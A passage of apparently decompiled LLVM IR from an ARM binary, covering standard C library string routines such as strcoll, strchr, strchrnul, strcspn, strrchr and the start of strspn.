  uselistorder i32 %v2_1743c, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_1743c, { 1, 0, 2 }
  uselistorder i32 %v0_1743c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1756c77, { 1, 0 }
  uselistorder i32 %v1_1741c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_17424, { 1, 0 }
  uselistorder i32 %v0_173f8, { 3, 0, 1, 2 }
  uselistorder i32 %v1_173ec, { 1, 2, 0, 3 }
  uselistorder i32 %v5_173d8, { 1, 0, 2 }
  uselistorder i32 %v1_173d4, { 1, 0 }
  uselistorder i32 %v1_173cc, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_173cc, { 1, 2, 0, 3 }
  uselistorder i32 %v4_173c4, { 0, 2, 1 }
  uselistorder i32 %v3_173c4, { 3, 0, 1, 2 }
  uselistorder i1 %v0_173c4, { 1, 0 }
  uselistorder i1 %v1_173c4, { 1, 0 }
  uselistorder i32 %v3_173c0, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_173b8, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_173a4, { 1, 2, 0 }
  uselistorder i32 %v1_1739c, { 0, 2, 1 }
  uselistorder i32 %v12_17398, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1738c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_17390, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_17380, { 0, 2, 1 }
  uselistorder i32 %v1_17378, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_17378, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_17370, { 1, 0 }
  uselistorder i32 %v1_17368, { 2, 1, 0 }
  uselistorder i32 %v2_17360, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_17360, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_1735c, { 1, 0 }
  uselistorder i32 %v2_17350, { 1, 0 }
  uselistorder i32 %v1_17350, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_17350, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 31, 1, 2, 3, 4, 5, 32, 6, 7, 8, 9, 10, 33, 11, 12, 13, 14, 15, 34, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 35, 36, 68, 37, 38, 39, 40, 41, 69, 42, 43, 44, 45, 46, 70, 47, 48, 49, 50, 51, 71, 52, 53, 54, 56, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 72 }
  uselistorder i32* %r1.global-to-local, { 0, 3, 1, 15, 2, 4, 6, 8, 5, 16, 7, 9, 11, 13, 10, 17, 12, 14, 18, 23, 19, 20, 21, 22, 24, 25, 27, 26, 28, 29, 38, 30, 31, 39, 32, 40, 33, 41, 34, 35, 36, 37, 42, 45, 43, 55, 44, 46, 49, 47, 56, 48, 50, 53, 51, 57, 52, 54, 58, 59, 62, 60, 63, 61, 64, 65, 66, 67 }
  uselistorder i32* %r0.global-to-local, { 0, 22, 1, 2, 23, 3, 4, 24, 5, 6, 7, 8, 9, 10, 25, 11, 13, 12, 14, 15, 26, 16, 17, 27, 18, 19, 20, 21, 28, 29, 31, 30, 32, 33, 34 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 26, 18, 19, 20, 27, 21, 22, 23, 28, 24, 25, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 24, 25, 2, 26, 0, 27, 1, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 2, 24, 0, 25, 1, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i1* %cpsr_n.global-to-local, { 3, 7, 4, 9, 5, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 2, 22, 23, 24, 25, 26, 6, 27, 0, 28, 1, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1, 6 }
  uselistorder i32 -5, { 1, 0, 2, 3 }
  uselistorder i32 -12, { 2, 12, 13, 3, 15, 16, 4, 17, 18, 14, 11, 10, 9, 8, 7, 19, 20, 21, 22, 6, 0, 5, 1, 23, 24 }
  uselistorder i32 -32, { 3, 2, 4, 0, 1, 5 }
  uselistorder i32 27, { 1, 0, 5, 6, 2, 7, 3, 8, 4, 9 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32 -4, { 17, 61, 62, 63, 6, 18, 19, 20, 64, 65, 66, 7, 21, 22, 23, 67, 68, 69, 8, 24, 25, 70, 16, 15, 71, 72, 73, 14, 13, 12, 11, 26, 27, 28, 29, 30, 5, 31, 3, 32, 4, 74, 10, 33, 48, 49, 50, 9, 51, 52, 53, 34, 47, 2, 35, 41, 42, 43, 44, 45, 46, 0, 1, 54, 55, 56, 57, 58, 59, 60, 36, 38, 39, 40, 37 }
  uselistorder label %dec_label_pc_177c0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17754, { 2, 0, 1 }
  uselistorder label %dec_label_pc_176e8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17688, { 1, 0 }
  uselistorder label %.thread14, { 2, 0, 1 }
  uselistorder label %.thread129, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_17614, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_175d8, { 1, 0 }
  uselistorder label %dec_label_pc_175c4, { 1, 0 }
  uselistorder label %dec_label_pc_17584, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17518, { 2, 0, 1 }
  uselistorder label %dec_label_pc_174ac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1744c, { 1, 0 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_1741c, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread115, { 1, 0 }
  uselistorder label %dec_label_pc_173b8, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_17378, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_177e4.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_177e4 = phi i32 [ %v0_177e4.pre, %bb ], [ %v5_177e4, %bb3 ]
  %v0_177e0 = phi i32 [ %tmp, %bb ], [ %v5_177e0, %bb3 ]
  %v1_177e0 = inttoptr i32 %v0_177e0 to i8*
  %v2_177e0 = load i8, i8* %v1_177e0, align 1
  %v1_177e4 = inttoptr i32 %v0_177e4 to i8*
  %v2_177e4 = load i8, i8* %v1_177e4, align 1
  %v3_177e4 = zext i8 %v2_177e4 to i32
  %v2_177e8 = icmp eq i8 %v2_177e0, 0
  br i1 %v2_177e8, label %.dec_label_pc_177f4_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_177e4 = add i32 %v0_177e4, 1
  %v5_177e0 = add i32 %v0_177e0, 1
  %v3_177e0 = zext i8 %v2_177e0 to i32
  %v10_177ec = icmp eq i8 %v2_177e0, %v2_177e4
  br i1 %v10_177ec, label %entry, label %dec_label_pc_177f4

.dec_label_pc_177f4_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_177f4

dec_label_pc_177f4:                               ; preds = %bb3, %.dec_label_pc_177f4_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_177f4_crit_edge ], [ %v3_177e0, %bb3 ]
  %v2_177f4.pre-phi = sub nsw i32 %.pn, %v3_177e4
  ret i32 %v2_177f4.pre-phi

; uselistorder directives
  uselistorder i8 %v2_177e0, { 0, 2, 1 }
  uselistorder i32 %v0_177e0, { 1, 0 }
  uselistorder i32 %v0_177e4, { 1, 0 }
  uselistorder label %dec_label_pc_177f4, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_17864 = urem i32 %arg1, 256
  %v0_178843 = load i32, i32* @r0, align 4
  %v1_178844 = urem i32 %v0_178843, 4
  %v2_178845 = icmp eq i32 %v1_178844, 0
  br i1 %v2_178845, label %dec_label_pc_1788c, label %dec_label_pc_1786c

dec_label_pc_1786c:                               ; preds = %entry, %dec_label_pc_17880
  %v0_17880 = phi i32 [ %v1_17880, %dec_label_pc_17880 ], [ %v0_178843, %entry ]
  %v1_1786c = inttoptr i32 %v0_17880 to i8*
  %v2_1786c = load i8, i8* %v1_1786c, align 1
  %v3_1786c = zext i8 %v2_1786c to i32
  %v9_17870 = icmp eq i32 %v3_1786c, %v1_17864
  br i1 %v9_17870, label %dec_label_pc_17940, label %dec_label_pc_17878

dec_label_pc_17878:                               ; preds = %dec_label_pc_1786c
  %v2_17878 = icmp eq i8 %v2_1786c, 0
  br i1 %v2_17878, label %dec_label_pc_1793c, label %dec_label_pc_17880

dec_label_pc_17880:                               ; preds = %dec_label_pc_17878
  %v1_17880 = add i32 %v0_17880, 1
  %v1_17884 = urem i32 %v1_17880, 4
  %v2_17884 = icmp eq i32 %v1_17884, 0
  br i1 %v2_17884, label %dec_label_pc_1788c, label %dec_label_pc_1786c

dec_label_pc_1788c:                               ; preds = %dec_label_pc_17880, %entry
  %v0_17890 = phi i32 [ %v0_178843, %entry ], [ %v1_17880, %dec_label_pc_17880 ]
  %v4_1788c = mul nuw nsw i32 %v1_17864, 256
  %v5_1788c = or i32 %v4_1788c, %v1_17864
  %v4_17894 = mul i32 %v5_1788c, 65536
  %v5_17894 = or i32 %v4_17894, %v5_1788c
  br label %dec_label_pc_17898

dec_label_pc_17898:                               ; preds = %dec_label_pc_17934, %dec_label_pc_178d4, %dec_label_pc_1788c
  %v0_178fc = phi i32 [ %v0_17890, %dec_label_pc_1788c ], [ %v4_17898, %dec_label_pc_178d4 ], [ %v4_17898, %dec_label_pc_17934 ]
  %v1_17898 = inttoptr i32 %v0_178fc to i32*
  %v2_17898 = load i32, i32* %v1_17898, align 4
  %v4_17898 = add i32 %v0_178fc, 4
  %v2_178a0 = xor i32 %v2_17898, %v5_17894
  %v2_178ac = add i32 %v2_17898, 2130640639
  %v1_178b0 = sub i32 -1, %v2_17898
  %v2_178b4 = xor i32 %v2_178ac, %v1_178b0
  %v2_178c0 = and i32 %v2_178b4, -2130640640
  store i32 %v2_178c0, i32* @r1, align 4
  %v2_178c8 = icmp eq i32 %v2_178c0, 0
  br i1 %v2_178c8, label %dec_label_pc_178d4, label %dec_label_pc_178dc

dec_label_pc_178d4:                               ; preds = %dec_label_pc_17898
  %v2_178a4 = add i32 %v2_178a0, 2130640639
  %v1_178bc = sub i32 -1, %v2_178a0
  %v2_178c4 = xor i32 %v2_178a4, %v1_178bc
  %v2_178cc = and i32 %v2_178c4, -2130640640
  %v2_178d4 = icmp eq i32 %v2_178cc, 0
  br i1 %v2_178d4, label %dec_label_pc_17898, label %dec_label_pc_178dc

dec_label_pc_178dc:                               ; preds = %dec_label_pc_17898, %dec_label_pc_178d4
  %v2_178dc = inttoptr i32 %v0_178fc to i8*
  %v3_178dc = load i8, i8* %v2_178dc, align 1
  %v4_178dc = zext i8 %v3_178dc to i32
  %v9_178e0 = icmp eq i32 %v4_178dc, %v1_17864
  br i1 %v9_178e0, label %dec_label_pc_17940, label %dec_label_pc_178ec

dec_label_pc_178ec:                               ; preds = %dec_label_pc_178dc
  %v2_178ec = icmp eq i8 %v3_178dc, 0
  br i1 %v2_178ec, label %dec_label_pc_1793c, label %dec_label_pc_178f4

dec_label_pc_178f4:                               ; preds = %dec_label_pc_178ec
  %v1_178f4 = add i32 %v0_178fc, 1
  %v2_178f4 = inttoptr i32 %v1_178f4 to i8*
  %v3_178f4 = load i8, i8* %v2_178f4, align 1
  %v4_178f4 = zext i8 %v3_178f4 to i32
  %v9_178f8 = icmp eq i32 %v4_178f4, %v1_17864
  br i1 %v9_178f8, label %dec_label_pc_17940, label %dec_label_pc_17904

dec_label_pc_17904:                               ; preds = %dec_label_pc_178f4
  %v2_17904 = icmp eq i8 %v3_178f4, 0
  br i1 %v2_17904, label %dec_label_pc_1793c, label %dec_label_pc_1790c

dec_label_pc_1790c:                               ; preds = %dec_label_pc_17904
  %v1_1790c = add i32 %v0_178fc, 2
  %v2_1790c = inttoptr i32 %v1_1790c to i8*
  %v3_1790c = load i8, i8* %v2_1790c, align 1
  %v4_1790c = zext i8 %v3_1790c to i32
  %v9_17910 = icmp eq i32 %v4_1790c, %v1_17864
  br i1 %v9_17910, label %dec_label_pc_17940, label %dec_label_pc_1791c

dec_label_pc_1791c:                               ; preds = %dec_label_pc_1790c
  %v2_1791c = icmp eq i8 %v3_1790c, 0
  br i1 %v2_1791c, label %dec_label_pc_1793c, label %dec_label_pc_17924

dec_label_pc_17924:                               ; preds = %dec_label_pc_1791c
  %v1_17924 = add i32 %v0_178fc, 3
  %v2_17924 = inttoptr i32 %v1_17924 to i8*
  %v3_17924 = load i8, i8* %v2_17924, align 1
  %v4_17924 = zext i8 %v3_17924 to i32
  %v9_17928 = icmp eq i32 %v4_17924, %v1_17864
  br i1 %v9_17928, label %dec_label_pc_17940, label %dec_label_pc_17934

dec_label_pc_17934:                               ; preds = %dec_label_pc_17924
  %v2_17934 = icmp eq i8 %v3_17924, 0
  br i1 %v2_17934, label %dec_label_pc_1793c, label %dec_label_pc_17898

dec_label_pc_1793c:                               ; preds = %dec_label_pc_17878, %dec_label_pc_17934, %dec_label_pc_1791c, %dec_label_pc_17904, %dec_label_pc_178ec
  br label %dec_label_pc_17940

dec_label_pc_17940:                               ; preds = %dec_label_pc_1786c, %dec_label_pc_17924, %dec_label_pc_1790c, %dec_label_pc_178f4, %dec_label_pc_178dc, %dec_label_pc_1793c
  %v1_17944 = phi i32 [ 0, %dec_label_pc_1793c ], [ %v1_17924, %dec_label_pc_17924 ], [ %v1_1790c, %dec_label_pc_1790c ], [ %v1_178f4, %dec_label_pc_178f4 ], [ %v0_178fc, %dec_label_pc_178dc ], [ %v0_17880, %dec_label_pc_1786c ]
  ret i32 %v1_17944

; uselistorder directives
  uselistorder i32 %v4_17898, { 1, 0 }
  uselistorder i32 %v2_17898, { 0, 2, 1 }
  uselistorder i32 %v0_178fc, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_1788c, { 1, 0 }
  uselistorder i32 %v1_17880, { 1, 0, 2 }
  uselistorder i32 %v0_178843, { 2, 1, 0 }
  uselistorder i32 %v1_17864, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_17940, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1793c, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_178dc, { 1, 0 }
  uselistorder label %dec_label_pc_1786c, { 1, 0 }
}

define i32 @__GI_strchrnul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_17954 = urem i32 %arg1, 256
  %v0_179742 = load i32, i32* @r0, align 4
  %v1_179743 = urem i32 %v0_179742, 4
  %v2_179744 = icmp eq i32 %v1_179743, 0
  br i1 %v2_179744, label %dec_label_pc_1797c, label %dec_label_pc_1795c

dec_label_pc_1795c:                               ; preds = %entry, %dec_label_pc_17970
  %v0_17970 = phi i32 [ %v1_17970, %dec_label_pc_17970 ], [ %v0_179742, %entry ]
  %v1_1795c = inttoptr i32 %v0_17970 to i8*
  %v2_1795c = load i8, i8* %v1_1795c, align 1
  %v3_1795c = zext i8 %v2_1795c to i32
  %v9_17960 = icmp eq i32 %v3_1795c, %v1_17954
  br i1 %v9_17960, label %dec_label_pc_17a2c, label %dec_label_pc_17968

dec_label_pc_17968:                               ; preds = %dec_label_pc_1795c
  %v2_17968 = icmp eq i8 %v2_1795c, 0
  br i1 %v2_17968, label %dec_label_pc_17a2c, label %dec_label_pc_17970

dec_label_pc_17970:                               ; preds = %dec_label_pc_17968
  %v1_17970 = add i32 %v0_17970, 1
  %v1_17974 = urem i32 %v1_17970, 4
  %v2_17974 = icmp eq i32 %v1_17974, 0
  br i1 %v2_17974, label %dec_label_pc_1797c, label %dec_label_pc_1795c

dec_label_pc_1797c:                               ; preds = %dec_label_pc_17970, %entry
  %v0_17980 = phi i32 [ %v0_179742, %entry ], [ %v1_17970, %dec_label_pc_17970 ]
  %v4_1797c = mul nuw nsw i32 %v1_17954, 256
  %v5_1797c = or i32 %v4_1797c, %v1_17954
  %v4_17984 = mul i32 %v5_1797c, 65536
  %v5_17984 = or i32 %v4_17984, %v5_1797c
  br label %dec_label_pc_17988

dec_label_pc_17988:                               ; preds = %dec_label_pc_17a24, %dec_label_pc_179c4, %dec_label_pc_1797c
  %v0_179ec = phi i32 [ %v0_17980, %dec_label_pc_1797c ], [ %v4_17988, %dec_label_pc_179c4 ], [ %v4_17988, %dec_label_pc_17a24 ]
  %v1_17988 = inttoptr i32 %v0_179ec to i32*
  %v2_17988 = load i32, i32* %v1_17988, align 4
  %v4_17988 = add i32 %v0_179ec, 4
  %v2_17990 = xor i32 %v2_17988, %v5_17984
  %v2_1799c = add i32 %v2_17988, 2130640639
  %v1_179a0 = sub i32 -1, %v2_17988
  %v2_179a4 = xor i32 %v2_1799c, %v1_179a0
  %v2_179b0 = and i32 %v2_179a4, -2130640640
  store i32 %v2_179b0, i32* @r1, align 4
  %v2_179b8 = icmp eq i32 %v2_179b0, 0
  br i1 %v2_179b8, label %dec_label_pc_179c4, label %dec_label_pc_179cc

dec_label_pc_179c4:                               ; preds = %dec_label_pc_17988
  %v2_17994 = add i32 %v2_17990, 2130640639
  %v1_179ac = sub i32 -1, %v2_17990
  %v2_179b4 = xor i32 %v2_17994, %v1_179ac
  %v2_179bc = and i32 %v2_179b4, -2130640640
  %v2_179c4 = icmp eq i32 %v2_179bc, 0
  br i1 %v2_179c4, label %dec_label_pc_17988, label %dec_label_pc_179cc

dec_label_pc_179cc:                               ; preds = %dec_label_pc_17988, %dec_label_pc_179c4
  %v2_179cc = inttoptr i32 %v0_179ec to i8*
  %v3_179cc = load i8, i8* %v2_179cc, align 1
  %v4_179cc = zext i8 %v3_179cc to i32
  %v9_179d0 = icmp eq i32 %v4_179cc, %v1_17954
  br i1 %v9_179d0, label %dec_label_pc_17a2c, label %dec_label_pc_179dc

dec_label_pc_179dc:                               ; preds = %dec_label_pc_179cc
  %v2_179dc = icmp eq i8 %v3_179cc, 0
  br i1 %v2_179dc, label %dec_label_pc_17a2c, label %dec_label_pc_179e4

dec_label_pc_179e4:                               ; preds = %dec_label_pc_179dc
  %v1_179e4 = add i32 %v0_179ec, 1
  %v2_179e4 = inttoptr i32 %v1_179e4 to i8*
  %v3_179e4 = load i8, i8* %v2_179e4, align 1
  %v4_179e4 = zext i8 %v3_179e4 to i32
  %v9_179e8 = icmp eq i32 %v4_179e4, %v1_17954
  br i1 %v9_179e8, label %dec_label_pc_17a2c, label %dec_label_pc_179f4

dec_label_pc_179f4:                               ; preds = %dec_label_pc_179e4
  %v2_179f4 = icmp eq i8 %v3_179e4, 0
  br i1 %v2_179f4, label %dec_label_pc_17a2c, label %dec_label_pc_179fc

dec_label_pc_179fc:                               ; preds = %dec_label_pc_179f4
  %v1_179fc = add i32 %v0_179ec, 2
  %v2_179fc = inttoptr i32 %v1_179fc to i8*
  %v3_179fc = load i8, i8* %v2_179fc, align 1
  %v4_179fc = zext i8 %v3_179fc to i32
  %v9_17a00 = icmp eq i32 %v4_179fc, %v1_17954
  br i1 %v9_17a00, label %dec_label_pc_17a2c, label %dec_label_pc_17a0c

dec_label_pc_17a0c:                               ; preds = %dec_label_pc_179fc
  %v2_17a0c = icmp eq i8 %v3_179fc, 0
  br i1 %v2_17a0c, label %dec_label_pc_17a2c, label %dec_label_pc_17a14

dec_label_pc_17a14:                               ; preds = %dec_label_pc_17a0c
  %v1_17a14 = add i32 %v0_179ec, 3
  %v2_17a14 = inttoptr i32 %v1_17a14 to i8*
  %v3_17a14 = load i8, i8* %v2_17a14, align 1
  %v4_17a14 = zext i8 %v3_17a14 to i32
  %v9_17a18 = icmp eq i32 %v4_17a14, %v1_17954
  br i1 %v9_17a18, label %dec_label_pc_17a2c, label %dec_label_pc_17a24

dec_label_pc_17a24:                               ; preds = %dec_label_pc_17a14
  %v2_17a24 = icmp eq i8 %v3_17a14, 0
  br i1 %v2_17a24, label %dec_label_pc_17a2c, label %dec_label_pc_17988

dec_label_pc_17a2c:                               ; preds = %dec_label_pc_17968, %dec_label_pc_1795c, %dec_label_pc_17a24, %dec_label_pc_17a14, %dec_label_pc_17a0c, %dec_label_pc_179fc, %dec_label_pc_179f4, %dec_label_pc_179e4, %dec_label_pc_179dc, %dec_label_pc_179cc
  %v1_17a30 = phi i32 [ %v1_17a14, %dec_label_pc_17a24 ], [ %v1_17a14, %dec_label_pc_17a14 ], [ %v1_179fc, %dec_label_pc_17a0c ], [ %v1_179fc, %dec_label_pc_179fc ], [ %v1_179e4, %dec_label_pc_179f4 ], [ %v1_179e4, %dec_label_pc_179e4 ], [ %v0_179ec, %dec_label_pc_179dc ], [ %v0_179ec, %dec_label_pc_179cc ], [ %v0_17970, %dec_label_pc_1795c ], [ %v0_17970, %dec_label_pc_17968 ]
  ret i32 %v1_17a30

; uselistorder directives
  uselistorder i32 %v4_17988, { 1, 0 }
  uselistorder i32 %v2_17988, { 0, 2, 1 }
  uselistorder i32 %v0_179ec, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_1797c, { 1, 0 }
  uselistorder i32 %v1_17970, { 1, 0, 2 }
  uselistorder i32 %v0_179742, { 2, 1, 0 }
  uselistorder i32 %v1_17954, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 2130640639, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_17a2c, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_179cc, { 1, 0 }
  uselistorder label %dec_label_pc_1795c, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_17a3c = load i32, i32* @r4, align 4
  store i32 %v3_17a3c, i32* %stack_var_-16, align 4
  %v6_17a3c = load i32, i32* @r5, align 4
  %v9_17a3c = load i32, i32* @r6, align 4
  %v0_17a40 = load i32, i32* @r0, align 4
  %v0_17a44 = load i32, i32* @r1, align 4
  store i32 %v0_17a44, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_17a608 = inttoptr i32 %v0_17a40 to i8*
  %v2_17a609 = load i8, i8* %v1_17a608, align 1
  %v3_17a6010 = zext i8 %v2_17a609 to i32
  store i32 %v3_17a6010, i32* @r1, align 4
  %v2_17a6411 = icmp eq i8 %v2_17a609, 0
  store i32 %v0_17a44, i32* @r0, align 4
  %v1_17a6c12 = add i32 %v0_17a40, 1
  store i32 %v1_17a6c12, i32* @r4, align 4
  br i1 %v2_17a6411, label %dec_label_pc_17a74, label %dec_label_pc_17a50

dec_label_pc_17a50:                               ; preds = %entry, %dec_label_pc_17a5c
  %v3_17a6014 = phi i32 [ %v3_17a60, %dec_label_pc_17a5c ], [ %v3_17a6010, %entry ]
  %v0_17a6813 = phi i32 [ %v0_17a68.pre, %dec_label_pc_17a5c ], [ %v0_17a44, %entry ]
  %v2_17a50 = call i32 @__GI_strchr(i32 %v0_17a6813, i32 %v3_17a6014)
  %v2_17a54 = icmp eq i32 %v2_17a50, 0
  %v0_17a5c = load i32, i32* @r5, align 4
  br i1 %v2_17a54, label %dec_label_pc_17a5c, label %dec_label_pc_17a74

dec_label_pc_17a5c:                               ; preds = %dec_label_pc_17a50
  %v1_17a5c = add i32 %v0_17a5c, 1
  %v0_17a60.pre = load i32, i32* @r4, align 4
  %v0_17a68.pre = load i32, i32* @r6, align 4
  store i32 %v1_17a5c, i32* @r5, align 4
  %v1_17a60 = inttoptr i32 %v0_17a60.pre to i8*
  %v2_17a60 = load i8, i8* %v1_17a60, align 1
  %v3_17a60 = zext i8 %v2_17a60 to i32
  store i32 %v3_17a60, i32* @r1, align 4
  %v2_17a64 = icmp eq i8 %v2_17a60, 0
  store i32 %v0_17a68.pre, i32* @r0, align 4
  %v1_17a6c = add i32 %v0_17a60.pre, 1
  store i32 %v1_17a6c, i32* @r4, align 4
  br i1 %v2_17a64, label %dec_label_pc_17a74, label %dec_label_pc_17a50

dec_label_pc_17a74:                               ; preds = %dec_label_pc_17a5c, %dec_label_pc_17a50, %entry
  %v0_17a74 = phi i32 [ 0, %entry ], [ %v0_17a5c, %dec_label_pc_17a50 ], [ %v1_17a5c, %dec_label_pc_17a5c ]
  %v2_17a78 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17a78, i32* @r4, align 4
  store i32 %v6_17a3c, i32* @r5, align 4
  store i32 %v9_17a3c, i32* @r6, align 4
  ret i32 %v0_17a74

; uselistorder directives
  uselistorder i32 %v3_17a60, { 1, 0 }
  uselistorder i32 %v0_17a68.pre, { 1, 0 }
  uselistorder i32 %v0_17a60.pre, { 1, 0 }
  uselistorder label %dec_label_pc_17a50, { 1, 0 }
}

define i32 @__GI_strrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_17a84 = urem i32 %arg2, 256
  store i32 %v1_17a84, i32* @r4, align 4
  %v2_17a84 = icmp eq i32 %v1_17a84, 0
  br i1 %v2_17a84, label %dec_label_pc_17a98, label %dec_label_pc_17aac.preheader

dec_label_pc_17aac.preheader:                     ; preds = %entry
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_17ab43 = call i32 @__GI_strchr(i32 %arg1, i32 %v1_17a84)
  %v2_17ab85 = icmp eq i32 %v2_17ab43, 0
  br i1 %v2_17ab85, label %dec_label_pc_17ac0, label %dec_label_pc_17aa4

dec_label_pc_17a98:                               ; preds = %entry
  %v2_17a9c = call i32 @__GI_strchr(i32 %arg1, i32 0)
  br label %dec_label_pc_17ac4

dec_label_pc_17aa4:                               ; preds = %dec_label_pc_17aac.preheader, %dec_label_pc_17aa4
  %v2_17ab46 = phi i32 [ %v2_17ab4, %dec_label_pc_17aa4 ], [ %v2_17ab43, %dec_label_pc_17aac.preheader ]
  store i32 %v2_17ab46, i32* @r5, align 4
  %v1_17aa8 = add i32 %v2_17ab46, 1
  store i32 %v1_17aa8, i32* @r0, align 4
  %v0_17ab0 = load i32, i32* @r4, align 4
  %v2_17ab4 = call i32 @__GI_strchr(i32 %v1_17aa8, i32 %v0_17ab0)
  %v2_17ab8 = icmp eq i32 %v2_17ab4, 0
  br i1 %v2_17ab8, label %dec_label_pc_17ac0, label %dec_label_pc_17aa4

dec_label_pc_17ac0:                               ; preds = %dec_label_pc_17aa4, %dec_label_pc_17aac.preheader
  %v0_17ac0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_17ac4

dec_label_pc_17ac4:                               ; preds = %dec_label_pc_17a98, %dec_label_pc_17ac0
  %storemerge = phi i32 [ %v2_17a9c, %dec_label_pc_17a98 ], [ %v0_17ac0, %dec_label_pc_17ac0 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_17ab4, { 1, 0 }
  uselistorder i32 %v1_17aa8, { 1, 0 }
  uselistorder i32 %v1_17a84, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_17ac4, { 1, 0 }
  uselistorder label %dec_label_pc_17aa4, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v0_17b002 = load i32, i32* @r0, align 4
  %v1_17b003 = inttoptr i32 %v0_17b002 to i8*
  %v2_17b004 = load i8, i8* %v1_17b003, align 1
  %v2_17b046 = icmp eq i8 %v2_17b004, 0
  br i1 %v2_17b046, label %dec_label_pc_17b10, label %dec_label_pc_17ae4.preheader

dec_label_pc_17adc:                               ; preds = %dec_label_pc_17ae4
  %v1_17aec = add i32 %v0_17aec, 1
  %v9_17adc = icmp eq i8 %v0_17adc10.in, %v2_17ae4
  br i1 %v9_17adc, label %dec_label_pc_17af8, label %dec_label_pc_17ae4

